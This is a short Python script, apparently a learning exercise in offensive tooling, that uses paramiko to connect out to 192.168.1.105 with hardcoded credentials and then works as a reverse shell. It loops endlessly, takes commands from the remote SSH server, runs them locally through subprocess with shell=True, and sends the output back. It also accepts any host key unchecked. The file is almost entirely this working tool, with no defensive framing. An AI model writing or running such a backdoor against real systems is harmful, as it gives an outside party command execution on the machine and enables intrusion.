import threading
import paramiko
import subprocess

RECV = 1024

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys(path)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd, port=port)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(RECV))

        while True:
            command = ssh_session.recv(RECV)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as E:
                ssh_session.send(str(E))
    client.close()
    return

ssh_command('192.168.1.105','22', 'Mirula', '123', 'whoami')